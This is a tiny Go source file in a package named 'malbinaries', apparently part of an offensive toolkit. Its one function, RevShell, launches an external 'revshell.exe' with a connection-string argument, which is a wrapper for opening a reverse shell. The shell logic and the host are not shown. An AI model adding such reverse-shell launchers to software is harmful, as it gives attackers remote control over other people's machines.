package malbinaries

import (
	"fmt"
	"os/exec"
)

func RevShell(cs string) {

	cmd := exec.Command("revshell.exe", cs)

	err := cmd.Run()

	if err != nil {
		fmt.Println("Could not run")
	}
}
